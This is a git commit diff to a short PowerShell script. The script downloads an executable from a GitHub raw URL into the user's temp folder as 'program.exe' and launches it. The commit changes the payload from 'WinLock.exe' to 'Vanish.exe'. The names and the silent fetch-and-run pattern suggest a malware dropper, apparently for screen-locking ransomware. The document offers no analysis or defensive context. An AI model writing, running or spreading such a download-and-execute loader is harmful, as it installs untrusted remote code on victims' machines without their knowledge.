fba9560b4c7d776766431364c2046be88a521a5b
fasa3e <gaveliianiskin@icloud.com>
2026-07-15 12:06:59 +0000

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/fasa3e/ergedrge/refs/heads/main/WinLock.exe"
+$url = "https://raw.githubusercontent.com/fasa3e/gsd/refs/heads/main/Vanish.exe"
 $output = "$env:TEMP\program.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
